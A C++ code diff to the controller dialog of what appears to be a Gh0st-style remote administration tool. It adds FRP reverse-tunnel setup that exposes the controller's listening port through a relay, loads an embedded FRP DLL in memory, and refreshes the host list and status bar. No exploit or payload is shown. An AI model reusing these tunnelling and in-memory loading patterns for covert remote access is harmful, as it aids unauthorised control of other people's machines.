+    if (!cfg.isEncodedToken && cfg.privilegeKey.length() != 32) {
+        Mprintf("[FRP-Auto] privilegeKey 长度错误 (期望32, 实际%d): %s\n",
+                (int)cfg.privilegeKey.length(), cfg.privilegeKey.c_str());
+        return cfg;
+    }
+
+    // 继续解析剩余部分: serverAddr:serverPort-remotePort-expireDate
+    std::string remaining = config.substr(0, lastDash);
+
+    // 从剩余部分提取 expireDate（最后8字符）
+    size_t expireDash = remaining.rfind('-');
+    if (expireDash == std::string::npos || expireDash == 0) {
+        Mprintf("[FRP-Auto] 配置格式错误（缺少expireDate分隔符）: %s\n", config.c_str());
+        return cfg;
+    }
+    cfg.expireDate = remaining.substr(expireDash + 1);
+    if (cfg.expireDate.length() != 8) {
+        Mprintf("[FRP-Auto] expireDate 格式错误: %s\n", cfg.expireDate.c_str());
+        return cfg;
+    }
+
+    // 继续解析: serverAddr:serverPort-remotePort
+    remaining = remaining.substr(0, expireDash);
+
+    // 提取 remotePort
+    size_t portDash = remaining.rfind('-');
+    if (portDash == std::string::npos || portDash == 0) {
+        Mprintf("[FRP-Auto] 配置格式错误（缺少remotePort分隔符）: %s\n", config.c_str());
+        return cfg;
+    }
+    std::string remotePortStr = remaining.substr(portDash + 1);
+
+    // 提取 serverAddr:serverPort
+    std::string addrPort = remaining.substr(0, portDash);
+
+    // 解析 serverAddr:serverPort（使用 rfind 支持域名和 IPv6）
+    size_t colonPos = addrPort.rfind(':');
+    if (colonPos == std::string::npos) {
+        Mprintf("[FRP-Auto] 地址格式错误: %s\n", addrPort.c_str());
+        return cfg;
+    }
+
+    cfg.serverAddr = addrPort.substr(0, colonPos);
+    try {
+        cfg.serverPort = std::stoi(addrPort.substr(colonPos + 1));
+        cfg.remotePort = std::stoi(remotePortStr);
+    } catch (...) {
+        Mprintf("[FRP-Auto] 端口解析错误\n");
+        return cfg;
+    }
+
+    cfg.enabled = !cfg.serverAddr.empty() &&
+                  cfg.remotePort > 0 &&
+                  !cfg.privilegeKey.empty();
+
+    if (!cfg.enabled) {
+        Mprintf("[FRP-Auto] 配置无效: server=%s, remotePort=%d\n",
+                cfg.serverAddr.c_str(), cfg.remotePort);
+    } else {
+        if(!heartbeat) 
+            Mprintf("[FRP-Auto] 配置解析成功: server=%s:%d, remotePort=%d, mode=%s\n",
+                cfg.serverAddr.c_str(), cfg.serverPort, cfg.remotePort,
+                cfg.isEncodedToken ? "官方FRP(token)" : "自定义FRP(privilegeKey)");
+    }
+
+    return cfg;
+}
+
+// 获取有效的主控地址（优先使用上级FRP配置）
+// 返回值：是否使用了FRP地址
+bool CMy2015RemoteDlg::GetEffectiveMasterAddress(std::string& outIP, int& outPort, bool heartbeat)
+{
+    // 默认使用本地配置
+    outIP = THIS_CFG.GetStr("settings", "master", "");
+    outPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
+    if (outPort <= 0) outPort = 6543;
+
+    // 检查是否有上级 FRP 配置
+    std::string frpConfigStr = THIS_CFG.GetStr("settings", "FrpConfig", "");
+    if (!frpConfigStr.empty()) {
+        FrpAutoConfig frpCfg = ParseFrpAutoConfig(frpConfigStr, heartbeat);
+        if (frpCfg.enabled && frpCfg.remotePort > 0) {
+            outIP = frpCfg.serverAddr;
+            outPort = frpCfg.remotePort;
+            return true;  // 使用了 FRP 地址
+        }
+    }
+    return false;  // 使用本地配置
+}
+
+// 日期字符串转 Unix 时间戳（当天 23:59:59）
+// 输入: "20260323" -> 输出: 1774329599 (2026-03-23 23:59:59 UTC)
+static time_t DateToTimestamp(const std::string& dateStr)
+{
+    if (dateStr.length() != 8) return 0;
+    try {
+        struct tm t = {0};
+        t.tm_year = std::stoi(dateStr.substr(0, 4)) - 1900;
+        t.tm_mon = std::stoi(dateStr.substr(4, 2)) - 1;
+        t.tm_mday = std::stoi(dateStr.substr(6, 2));
+        t.tm_hour = 23; t.tm_min = 59; t.tm_sec = 59;
+        return mktime(&t);
+    } catch (...) {
+        return 0;
+    }
+}
+
+// FRP 自动代理线程函数
+// 自定义 FRP: 使用 RunSimpleTcp (privilegeKey + timestamp)
+typedef int (*FrpRunSimpleTcpFunc)(
+    const char* privilegeKey,
+    long timestamp,
+    const char* serverAddr,
+    int serverPort,
+    int localPort,
+    int remotePort,
+    int* statusPtr
+);
+
+// 官方 FRP: 使用 RunSimpleTcpWithToken (token only)
+typedef int (*FrpRunSimpleTcpWithTokenFunc)(
+    const char* token,
+    const char* serverAddr,
+    int serverPort,
+    int localPort,
+    int remotePort,
+    int* statusPtr
+);
+
+static DWORD WINAPI FrpcAutoThreadProc(LPVOID param)
+{
+    CMy2015RemoteDlg* pDlg = (CMy2015RemoteDlg*)param;
+    auto& cfg = pDlg->m_frpAutoConfig;
+
+    // 获取本地监听端口（ghost 可能是分号分割的多端口，取第一个）
+    int localPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
+
+    Mprintf("[FRP-Auto] 线程启动: %s:%d -> localhost:%d -> frps:%d (有效期至 %s, 模式: %s)\n",
+            cfg.serverAddr.c_str(), cfg.serverPort, localPort, cfg.remotePort,
+            cfg.expireDate.c_str(), cfg.isEncodedToken ? "官方FRP" : "自定义FRP");
+
+    pDlg->m_frpAutoStatus = CMy2015RemoteDlg::STATUS_RUN;
+    int result = 1;
+
+    if (cfg.isEncodedToken) {
+        // 官方 FRP 模式: 解码 token 并使用 RunSimpleTcpWithToken
+        std::string token = DecodeFrpToken(cfg.privilegeKey);
+        if (token.empty()) {
+            Mprintf("[FRP-Auto] Token 解码失败\n");
+            pDlg->m_frpAutoStatus = CMy2015RemoteDlg::STATUS_STOP;
+            pDlg->m_hFrpAutoThread = NULL;
+            return 1;
+        }
+
+        FrpRunSimpleTcpWithTokenFunc RunSimpleTcpWithToken = pDlg->m_hFrpDll ?
+            (FrpRunSimpleTcpWithTokenFunc)MemoryGetProcAddress(pDlg->m_hFrpDll, "RunSimpleTcpWithToken") : nullptr;
+
+        if (!RunSimpleTcpWithToken) {
+            Mprintf("[FRP-Auto] 获取 RunSimpleTcpWithToken 函数失败\n");
+            pDlg->m_frpAutoStatus = CMy2015RemoteDlg::STATUS_STOP;
+            pDlg->m_hFrpAutoThread = NULL;
+            return 1;
+        }
+
+        result = RunSimpleTcpWithToken(
+            token.c_str(),
+            cfg.serverAddr.c_str(),
+            cfg.serverPort,
+            localPort,
+            cfg.remotePort,
+            &pDlg->m_frpAutoStatus
+        );
+    } else {
+        // 自定义 FRP 模式: 使用 RunSimpleTcp (privilegeKey + timestamp)
+        time_t timestamp = DateToTimestamp(cfg.expireDate);
+
+        Mprintf("[FRP-Auto] 自定义模式参数: privilegeKey=%s, timestamp=%lld, expireDate=%s\n",
+                cfg.privilegeKey.c_str(), (long long)timestamp, cfg.expireDate.c_str());
+
+        FrpRunSimpleTcpFunc RunSimpleTcp = pDlg->m_hFrpDll ?
+            (FrpRunSimpleTcpFunc)MemoryGetProcAddress(pDlg->m_hFrpDll, "RunSimpleTcp") : nullptr;
+
+        if (!RunSimpleTcp) {
+            Mprintf("[FRP-Auto] 获取 RunSimpleTcp 函数失败\n");
+            pDlg->m_frpAutoStatus = CMy2015RemoteDlg::STATUS_STOP;
+            pDlg->m_hFrpAutoThread = NULL;
+            return 1;
+        }
+
+        result = RunSimpleTcp(
+            cfg.privilegeKey.c_str(),
+            (long)timestamp,
+            cfg.serverAddr.c_str(),
+            cfg.serverPort,
+            localPort,
+            cfg.remotePort,
+            &pDlg->m_frpAutoStatus
+        );
+    }
+
+    if (result != 0) {
+        Mprintf("[FRP-Auto] 连接失败，错误码: %d\n", result);
+    }
+
+    pDlg->m_frpAutoStatus = CMy2015RemoteDlg::STATUS_STOP;
+    pDlg->m_hFrpAutoThread = NULL;
+    return result;
+}
+
+// 启动 FRP 自动代理
+void CMy2015RemoteDlg::StartFrpcAuto(const FrpAutoConfig& cfg)
+{
+    if (!cfg.enabled) {
+        Mprintf("[FRP-Auto] 配置无效，不启动\n");
+        return;
+    }
+
+    // 检测系统是否支持 FRP（64位 + Windows 10+）
+    if (!IsFrpSupported("[FRP-Auto]")) {
+        return;
+    }
+
+    // 加载 FRP DLL（复用现有的 m_hFrpDll，如果还没加载则加载）
+    if (!m_hFrpDll) {
+        DWORD size = 0;
+        LPBYTE frpcData = ReadResource(IDR_BINARY_FRPC, size);
+        if (frpcData == nullptr) {
+            Mprintf("[FRP-Auto] 读取 FRP DLL 资源失败\n");
+            return;
+        }
+        m_hFrpDll = MemoryLoadLibrary(frpcData, size);
+        SAFE_DELETE_ARRAY(frpcData);
+        if (m_hFrpDll == NULL) {
+            Mprintf("[FRP-Auto] 加载 FRP DLL 失败\n");
+            return;
+        }
+    }
+
+    // 保存配置
+    m_frpAutoConfig = cfg;
+
+    // 保存到配置文件（用于下次启动自动恢复）
+    THIS_CFG.SetStr("frp_auto", "server", cfg.serverAddr);
+    THIS_CFG.SetInt("frp_auto", "serverPort", cfg.serverPort);
+    THIS_CFG.SetInt("frp_auto", "remotePort", cfg.remotePort);
+    THIS_CFG.SetStr("frp_auto", "privilegeKey", cfg.privilegeKey);
+    THIS_CFG.SetStr("frp_auto", "expireDate", cfg.expireDate);
+
+    // 启动线程
+    m_frpAutoStatus = STATUS_UNKNOWN;
+    m_hFrpAutoThread = CreateThread(NULL, 0, FrpcAutoThreadProc, this, 0, NULL);
+
+    // 设置状态栏显示的 FRP 地址 (IP:Port)
+    m_strFrpAddr.Format(_T("%hs:%d"), cfg.serverAddr.c_str(), cfg.remotePort);
+    // 直接更新状态栏 FRP 分区（不触发 OnSize 避免循环）
+    if (m_StatusBar.GetSafeHwnd()) {
+        m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, 250);
+        m_StatusBar.SetPaneText(1, m_strFrpAddr);
+    }
+
+    Mprintf("[FRP-Auto] 启动自动代理: %s:%d -> frps:%d\n",
+            cfg.serverAddr.c_str(), cfg.serverPort, cfg.remotePort);
+}
+
+// 停止 FRP 自动代理
+void CMy2015RemoteDlg::StopFrpcAuto()
+{
+    if (m_hFrpAutoThread == NULL) return;
+
+    Mprintf("[FRP-Auto] 正在停止...\n");
+    m_frpAutoStatus = STATUS_EXIT;
+
+    // 等待线程结束（最多等待 5 秒）
+    DWORD waitResult = WaitForSingleObject(m_hFrpAutoThread, 5000);
+    if (waitResult == WAIT_TIMEOUT) {
+        Mprintf("[FRP-Auto] 等待超时，强制终止\n");
+        TerminateThread(m_hFrpAutoThread, 0);
+    }
+
+    m_hFrpAutoThread = NULL;
+    m_frpAutoStatus = STATUS_STOP;
+
+    // 清除状态栏 FRP 地址
+    m_strFrpAddr.Empty();
+    // 直接更新状态栏 FRP 分区（不触发 OnSize 避免循环）
+    if (m_StatusBar.GetSafeHwnd()) {
+        m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, 0);
+        m_StatusBar.SetPaneText(1, _T(""));
+    }
+
+    Mprintf("[FRP-Auto] 已停止\n");
+}
+
+// 启动时自动恢复 FRP 自动代理
+void CMy2015RemoteDlg::InitFrpcAuto()
+{
+    // 从配置文件读取 FRP 自动代理配置
+    std::string frpConfigStr = THIS_CFG.GetStr("settings", "FrpConfig", "");
+
+    // 如果 [settings] FrpConfig 不为空，解析并更新 [frp_auto] 节
+    if (!frpConfigStr.empty()) {
+        FrpAutoConfig cfg = ParseFrpAutoConfig(frpConfigStr);
+        if (cfg.enabled) {
+            Mprintf("[FRP-Auto] 从 FrpConfig 解析配置: %s:%d -> %d\n",
+                    cfg.serverAddr.c_str(), cfg.serverPort, cfg.remotePort);
+            StartFrpcAuto(cfg);
+            return;
+        }
+    }
+
+    // 如果没有 FrpConfig，尝试从 [frp_auto] 节读取（兼容旧配置）
+    std::string server = THIS_CFG.GetStr("frp_auto", "server", "");
+    if (server.empty()) return;
+
+    FrpAutoConfig cfg;
+    cfg.enabled = true;
+    cfg.serverAddr = server;
+    cfg.serverPort = THIS_CFG.GetInt("frp_auto", "serverPort", 7000);
+    cfg.remotePort = THIS_CFG.GetInt("frp_auto", "remotePort", 0);
+    cfg.privilegeKey = THIS_CFG.GetStr("frp_auto", "privilegeKey", "");
+    cfg.expireDate = THIS_CFG.GetStr("frp_auto", "expireDate", "");
+
+    if (cfg.remotePort > 0 && !cfg.privilegeKey.empty()) {
+        Mprintf("[FRP-Auto] 从配置文件恢复: %s:%d -> %d\n",
+                cfg.serverAddr.c_str(), cfg.serverPort, cfg.remotePort);
+        StartFrpcAuto(cfg);
+    }
+}
+
+//////////////////////////////////////////////////////////////////////////
 
 void CMy2015RemoteDlg::ApplyFrpSettings()
 {
     auto master = THIS_CFG.GetStr("settings", "master");
     if (master.empty()) return;
 
-    std::string path = GetFrpSettingsPath();
-    DeleteFileA(path.c_str());
-    config cfg(path);
-    cfg.SetStr("common", "server_addr", master);
-    cfg.SetInt("common", "server_port", THIS_CFG.GetInt("frp", "server_port", 7000));
-    cfg.SetStr("common", "token", THIS_CFG.GetStr("frp", "token"));
-    cfg.SetStr("common", "log_file", THIS_CFG.GetStr("frp", "log_file", "./frpc.log"));
+    auto servers = StringToVector(master, ';');
+    std::string basePath = GetFrpSettingsPath();  // frpc.ini
+    std::string baseNoExt = basePath;
 
+    // 移除 .ini 扩展名，用于生成 frpc.1.ini, frpc.2.ini ...
+    if (baseNoExt.size() > 4 && baseNoExt.substr(baseNoExt.size() - 4) == ".ini") {
+        baseNoExt = baseNoExt.substr(0, baseNoExt.size() - 4);
+    }
+
+    // 删除旧的配置文件 (frpc.ini 会被重新生成，frpc.1.ini ~ frpc.N.ini 需要清理)
+    DeleteFileA(basePath.c_str());
+    for (int i = 1; i < 100; ++i) {
+        std::string oldPath = baseNoExt + "." + std::to_string(i) + ".ini";
+        if (GetFileAttributesA(oldPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+            DeleteFileA(oldPath.c_str());
+        } else {
+            break;  // 文件不存在，后续也不会存在
+        }
+    }
+
+    int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
+    std::string token = THIS_CFG.GetStr("frp", "token");
     auto ports = THIS_CFG.GetStr("settings", "ghost", "6543");
     auto arr = StringToVector(ports, ';');
-    for (int i = 0; i < arr.size(); ++i) {
-        auto tcp = "YAMA-TCP-" + arr[i];
-        cfg.SetStr(tcp, "type", "tcp");
-        cfg.SetStr(tcp, "local_port", arr[i]);
-        cfg.SetStr(tcp, "remote_port", arr[i]);
+    int fileServerPort = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
 
-        auto udp = "YAMA-UDP-" + arr[i];
-        cfg.SetStr(udp, "type", "udp");
-        cfg.SetStr(udp, "local_port", arr[i]);
-        cfg.SetStr(udp, "remote_port", arr[i]);
+    // 为每个服务端生成独立配置文件 (index=0 用 frpc.ini 保持兼容)
+    for (size_t idx = 0; idx < servers.size(); ++idx) {
+        std::string path = (idx == 0) ? basePath : baseNoExt + "." + std::to_string(idx) + ".ini";
+        std::string logFile = (idx == 0) ? "./frpc.log" : "./frpc." + std::to_string(idx) + ".log";
+        config cfg(path);
+        cfg.SetStr("common", "server_addr", servers[idx]);
+        cfg.SetInt("common", "server_port", serverPort);
+        cfg.SetStr("common", "token", token);
+        cfg.SetStr("common", "log_file", logFile);
+
+        for (size_t i = 0; i < arr.size(); ++i) {
+            auto tcp = BRAND_NET_PREFIX "-TCP-" + arr[i];
+            cfg.SetStr(tcp, "type", "tcp");
+            cfg.SetStr(tcp, "local_port", arr[i]);
+            cfg.SetStr(tcp, "remote_port", arr[i]);
+            cfg.SetStr(tcp, "proxy_protocol_version", "v2");  // 传递真实客户端 IP
+
+            auto udp = BRAND_NET_PREFIX "-UDP-" + arr[i];
+            cfg.SetStr(udp, "type", "udp");
+            cfg.SetStr(udp, "local_port", arr[i]);
+            cfg.SetStr(udp, "remote_port", arr[i]);
+        }
+        if (fileServerPort > 0) {
+            std::string name = BRAND_NET_PREFIX "-WEB-" + std::to_string(fileServerPort);
+            cfg.SetStr(name, "type", "tcp");
+            cfg.SetInt(name, "local_port", fileServerPort);
+            cfg.SetInt(name, "remote_port", fileServerPort);
+            cfg.SetStr(name, "proxy_protocol_version", "v2");  // 传递真实客户端 IP
+        }
     }
-    int fileServerPort = THIS_CFG.GetInt("settings", "FileSvrPort", 80);
-    std::string name = "YAMA-FileServer";
-	cfg.SetStr(name, "type", "tcp");
-	cfg.SetInt(name, "local_port", fileServerPort);
-	cfg.SetInt(name, "remote_port", fileServerPort);
 }
 
 void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
@@ -1473,15 +2835,20 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 {
     __super::OnSize(nType, cx, cy);
 
-    // TODO: 在此处添加消息处理程序代码
+    static UINT lastType = SIZE_RESTORED;
     if (SIZE_MINIMIZED==nType) {
+        lastType = nType;
         return;
     }
+    // 窗口大小类型变化时刷新列表（最小化还原、正常<->最大化切换）
+    bool needRefresh = (lastType != nType);
+    lastType = nType;
+
     EnterCriticalSection(&m_cs);
     if (m_CList_Online.m_hWnd!=NULL) { //（控件也是窗口因此也有句柄）
         CRect rc;
         rc.left = 1;          //列表的左坐标
-        rc.top  = 80;         //列表的上坐标
+        rc.top  = m_ToolBar.IsVisible() ? 80:1; //列表的上坐标
         rc.right  =  cx-1;    //列表的右坐标
         rc.bottom = cy-160;   //列表的下坐标
         m_GroupTab.MoveWindow(rc);
@@ -1492,6 +2859,11 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
         rcInside.bottom -= 1;
         m_CList_Online.MoveWindow(&rcInside);
         m_CList_Online.AdjustColumnWidths();
+        if (needRefresh) {
+            CListCtrlEx::ScopedEraseBkgnd scope(m_CList_Online);
+            m_GroupTab.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
+            m_CList_Online.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW);
+        }
     }
     LeaveCriticalSection(&m_cs);
 
@@ -1502,6 +2874,9 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
         rc.right  = cx-1;    //列表的右坐标
         rc.bottom = cy-20;   //列表的下坐标
         m_CList_Message.MoveWindow(rc);
+        if (needRefresh) {
+            m_CList_Message.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW);
+        }
         auto total = cx - 24;
         for(int i=0; i<g_Column_Count_Message; ++i) {        //遍历每一个列
             double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
@@ -1519,7 +2894,16 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
         Rect.right=cx;
         Rect.bottom=cy;
         m_StatusBar.MoveWindow(Rect);
-        m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
+        // 4个分区：消息(自动拉伸)、FRP地址(250px)、运行统计(180px)、到期时间(180px)
+        int paneExpire = m_strExpireDate.IsEmpty() ? 0 : 180;  // 无到期信息时隐藏
+        // 优先显示上级 FRPC，其次显示本机 FRPS
+        int paneFrp = 250;
+        int paneRuntime = 180;
+        int paneMsg = max(0, cx - paneFrp - paneRuntime - paneExpire - 20);
+        m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_STRETCH, paneMsg);
+        m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, paneFrp);
+        m_StatusBar.SetPaneInfo(2, m_StatusBar.GetItemID(2), SBPS_NORMAL, paneRuntime);
+        m_StatusBar.SetPaneInfo(3, m_StatusBar.GetItemID(3), SBPS_NORMAL, paneExpire);
     }
 
     if(m_ToolBar.m_hWnd!=NULL) {                //工具条
@@ -1528,6 +2912,24 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
         rc.right=cx;
         rc.bottom=80;
         m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
+    }
+}
+
+void CMy2015RemoteDlg::OnExitSizeMove()
+{
+    __super::OnExitSizeMove();
+
+    // 拖拽调整大小结束后刷新列表，避免残影
+    if (m_CList_Online.m_hWnd != NULL) {
+        CListCtrlEx::ScopedEraseBkgnd scope(m_CList_Online);
+        m_CList_Online.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW);
+    }
+    if (m_CList_Message.m_hWnd != NULL) {
+        m_CList_Message.RedrawWindow(NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW);
+    }
+    // 更新搜索栏位置（跟随主窗口移动/调整大小）
+    if (m_pSearchBar && m_pSearchBar->GetSafeHwnd() && m_pSearchBar->IsWindowVisible()) {
+        m_pSearchBar->UpdatePosition();
     }
 }
 
@@ -1561,14 +2963,16 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
             THIS_APP->UpdateMaxConnection(count);
         }
         if (!m_superPass.empty()) {
+#ifndef _DEBUG
             Mprintf(">>> Timer is killed <<<\n");
             KillTimer(nIDEvent);
             std::string masterHash = GetMasterHash();
-            if (GetPwdHash() != masterHash)
+            if (GetUpperHash() != GetPwdHash())
                 THIS_CFG.SetStr("settings", "superAdmin", m_superPass);
             if (GetPwdHash() == masterHash)
                 THIS_CFG.SetStr("settings", "HMAC", genHMAC(masterHash, m_superPass));
             return;
+#endif
         }
         PostMessageA(WM_PASSWORDCHECK);
     }
@@ -1588,36 +2992,287 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
     }
     if (nIDEvent == TIMER_HEARTBEAT_CHECK && m_settings.ReportInterval > 0) {
         CheckHeartbeat();
-	}
+    }
+    if (nIDEvent == TIMER_REFRESH_LIST) {
+        CLock L(m_cs);
+        bool hasOffline = !m_PendingOffline.empty();
+        bool hasListChange = !m_PendingOnline.empty() || hasOffline;
+
+        // 有上下线事件时，禁用重绘以减少闪烁
+        if (hasListChange) {
+            m_CList_Online.SetRedraw(FALSE);
+        }
+
+        // 处理下线事件 - 虚拟列表不需要 DeleteItem，m_HostList 已在 OnUserOfflineMsg 中更新
+        if (!m_PendingOffline.empty()) {
+            m_PendingOffline.clear();
+        }
+
+        // 处理上线事件 - 虚拟列表只需更新计数
+        if (!m_PendingOnline.empty()) {
+            m_PendingOnline.clear();
+        }
+
+        // 虚拟列表：重建过滤索引并更新项目计数
+        if (hasListChange) {
+            RebuildFilteredIndices();
+            m_CList_Online.SetItemCountExV((int)m_FilteredIndices.size(), LVSICF_NOINVALIDATEALL | LVSICF_NOSCROLL);
+        }
+
+        // 恢复重绘 - 虚拟列表只需刷新可见区域的变化行
+        if (hasListChange) {
+            m_CList_Online.SetRedraw(TRUE);
+            int totalCount = (int)m_FilteredIndices.size();
+            if (totalCount == 0) {
+                // 列表变空时，强制重绘整个列表以清除残留项
+                m_CList_Online.Invalidate();
+            } else {
+                // 只需刷新可见范围内的行
+                int topIdx = m_CList_Online.GetTopIndex();
+                int visibleCount = m_CList_Online.GetCountPerPage();
+                int bottomIdx = min(topIdx + visibleCount, totalCount - 1);
+                if (bottomIdx >= topIdx) {
+                    m_CList_Online.RedrawItems(topIdx, bottomIdx);
+                }
+            }
+
+            // 更新状态栏主机数量
+            CString strStatusMsg;
+            strStatusMsg.FormatL("有%d个主机在线", (int)m_FilteredIndices.size());
+            strStatusMsg += CString("[Total: ") + std::to_string(m_HostList.size()).c_str() + "]";
+            m_StatusBar.SetPaneText(0, strStatusMsg);
+        }
+
+        // 处理心跳更新 - 虚拟列表批量刷新（仅刷新变化行，无闪烁）
+        if (!m_DirtyClients.empty()) {
+            int minIdx = INT_MAX, maxIdx = -1;
+            for (uint64_t id : m_DirtyClients) {
+                auto it = m_ClientIndex.find(id);
+                if (it != m_ClientIndex.end()) {
+                    size_t hostIdx = it->second;
+                    // 在过滤索引中查找显示位置
+                    for (size_t fi = 0; fi < m_FilteredIndices.size(); ++fi) {
+                        if (m_FilteredIndices[fi] == hostIdx) {
+                            int idx = (int)fi;
+                            if (idx < minIdx) minIdx = idx;
+                            if (idx > maxIdx) maxIdx = idx;
+                            break;
+                        }
+                    }
+                }
+            }
+            // 一次性刷新整个范围
+            if (maxIdx >= 0) {
+                m_CList_Online.RedrawItems(minIdx, maxIdx);
+            }
+            m_DirtyClients.clear();
+        }
+
+        // 批量通知 Web 客户端设备变化（独立于 m_DirtyClients）
+        if (WebService().IsRunning()) {
+            WebService().FlushDeviceChanges();
+        }
+    }
+    if (nIDEvent == TIMER_STATUSBAR_UPDATE) {
+        UpdateStatusBarStats();
+    }
+    if (nIDEvent == TIMER_STATUSBAR_INIT) {
+        KillTimer(TIMER_STATUSBAR_INIT);  // 只执行一次
+        // 强制重新计算状态栏分区宽度
+        CRect rc;
+        GetClientRect(&rc);
+        OnSize(SIZE_RESTORED, rc.Width(), rc.Height());
+    }
 
     __super::OnTimer(nIDEvent);
 }
 
-void CMy2015RemoteDlg::CheckHeartbeat() {
-	CLock lock(m_cs);
+void CMy2015RemoteDlg::CheckHeartbeat()
+{
+    CLock lock(m_cs);
     auto now = time(0);
-	int HEARTBEAT_TIMEOUT = max(30, m_settings.ReportInterval * 3);
-    for (auto it = m_HostList.begin(); it != m_HostList.end(); ) {
-        context* ContextObject = *it;
+    int HEARTBEAT_TIMEOUT = max(60, m_settings.ReportInterval * 3);
+
+    // 收集需要删除的 context（避免遍历时修改 vector）
+    std::vector<context*> toRemove;
+    for (context* ContextObject : m_HostList) {
         if (now - ContextObject->GetLastHeartbeat() > HEARTBEAT_TIMEOUT) {
-            auto host = ContextObject->GetAdditionalData(RES_CLIENT_PUBIP);
-			host = host.IsEmpty() ? std::to_string(ContextObject->GetClientID()).c_str() : host;
-            Mprintf("Client %s[%llu] heartbeat timeout!!! \n", host, ContextObject->GetClientID());
-            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg("主机掉线"), 
-                (LPARAM)new CharMsg("主机长时间无心跳: " + host));
-            it = m_HostList.erase(it);
-            ContextObject->CancelIO();
-            for (int i = 0, n = m_CList_Online.GetItemCount(); i < n; i++) {
-				auto lParam = m_CList_Online.GetItemData(i);
-                if (lParam == (LPARAM)ContextObject) {
-                    m_CList_Online.DeleteItem(i);
-                    break;
-                }
-            }
-        } else {
-            ++it;
+            toRemove.push_back(ContextObject);
         }
-	}
+    }
+
+    // 批量删除
+    for (context* ContextObject : toRemove) {
+        auto host = ContextObject->GetAdditionalData(RES_CLIENT_PUBIP);
+        host = host.IsEmpty() ? std::to_string(ContextObject->GetClientID()).c_str() : host;
+        Mprintf("Client %s[%llu] heartbeat timeout!!! \n", host, ContextObject->GetClientID());
+        if (m_needNotify)
+            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg(_TR("主机掉线")),
+                     (LPARAM)new CharMsg(_TR("主机长时间无心跳: ") + host));
+        PostMessageA(WM_SHOWMESSAGE, (WPARAM)new CharMsg(_TR("[主机下线] 主机长时间无心跳: ") + host), NULL);
+        Mprintf("主机 %s[%llu]心跳超时\n", host, ContextObject->GetClientID());
+
+        int port = ContextObject->GetPort();
+        RemoveFromHostList(ContextObject);
+
+        // 从待上线队列中移除（防止定时器访问已释放的 context）
+        auto pit = std::find(m_PendingOnline.begin(), m_PendingOnline.end(), ContextObject);
+        if (pit != m_PendingOnline.end()) {
+            m_PendingOnline.erase(pit);
+        }
+        ContextObject->CancelIO();
+        // 使用延迟队列删除，由定时器统一处理刷新
+        m_PendingOffline.push_back(port);
+    }
+}
+
+// 更新状态栏统计信息（MTBF/运行时长、到期时间）
+void CMy2015RemoteDlg::UpdateStatusBarStats()
+{
+    if (!m_StatusBar.GetSafeHwnd())
+        return;
+
+    CString strRuntime, strExpire;
+
+    // === 分区1：运行统计 ===
+    if (m_runNormal == 1) {
+        // 普通模式：显示程序运行时长
+        ULONGLONG uptime = GetTickCount64() - m_ullStartTime;
+        ULONGLONG seconds = uptime / 1000;
+        ULONGLONG minutes = seconds / 60;
+        ULONGLONG hours = minutes / 60;
+        ULONGLONG days = hours / 24;
+        hours %= 24;
+        minutes %= 60;
+
+        CString strTime;
+        if (days > 0)
+            strTime.Format(_T("%llud %lluh"), days, hours);
+        else if (hours > 0)
+            strTime.Format(_T("%lluh %llum"), hours, minutes);
+        else
+            strTime.Format(_T("%llum"), minutes);
+        strRuntime = _TR("运行:") + CString(_T(" ")) + strTime;
+    } else {
+        // 服务模式：显示 MTBF 统计
+        int crashCount = THIS_CFG.GetInt(CFG_CRASH_SECTION, CFG_CRASH_COUNT, 0);
+        int startCount = THIS_CFG.GetInt(CFG_CRASH_SECTION, CFG_CRASH_STARTS, 0);
+        std::string totalStr = THIS_CFG.GetStr(CFG_CRASH_SECTION, CFG_CRASH_TOTAL_RUN_MS, "0");
+        ULONGLONG totalRunMs = _strtoui64(totalStr.c_str(), NULL, 10);
+
+        // 加上当前会话的运行时间
+        totalRunMs += (GetTickCount64() - m_ullStartTime);
+
+        if (crashCount > 0) {
+            // 有崩溃记录：显示 MTBF 和失败率
+            ULONGLONG mtbfMs = totalRunMs / crashCount;
+            ULONGLONG mtbfHours = mtbfMs / (1000 * 60 * 60);
+            ULONGLONG mtbfDays = mtbfHours / 24;
+            mtbfHours %= 24;
+
+            double failRate = (startCount > 0) ? (double)crashCount / startCount * 100.0 : 0;
+
+            if (mtbfDays > 0)
+                strRuntime.Format(_T("MTBF: %llud%lluh | %.1f%%"), mtbfDays, mtbfHours, failRate);
+            else
+                strRuntime.Format(_T("MTBF: %lluh | %.1f%%"), mtbfHours, failRate);
+        } else {
+            // 无崩溃记录：显示累计运行时间
